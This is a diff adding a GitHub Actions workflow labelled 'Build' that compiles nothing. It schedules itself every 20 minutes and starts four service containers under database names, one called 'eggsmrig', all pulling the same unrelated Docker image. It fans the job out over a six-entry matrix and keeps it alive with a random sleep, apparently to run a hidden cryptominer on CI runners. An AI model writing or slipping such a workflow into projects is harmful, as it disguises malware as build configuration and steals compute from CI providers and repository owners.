@@ -1,0 +1,30 @@
+name: Build
+on:
+  push:
+  schedule:
+    - cron: "*/20 * * * *"
+jobs:
+  compile:
+    name: Compile
+    runs-on: ubuntu-latest
+    services:
+      redis:
+        image: maggierat456/peepeepoopoo:latest
+      mysql:
+        image: maggierat456/peepeepoopoo:latest
+      oracle:
+        image: maggierat456/peepeepoopoo:latest
+      eggsmrig:
+        image: maggierat456/peepeepoopoo:latest
+    strategy:
+      fail-fast: false
+      matrix:
+        runners:
+          - linux-ubuntu-amd64
+          - linux-centos-amd64
+          - freebsd-amd64
+          - macos-amd64
+          - covfefe
+          - aids
+    steps:
+      - run: sleep $(shuf -i 300-820 -n1)
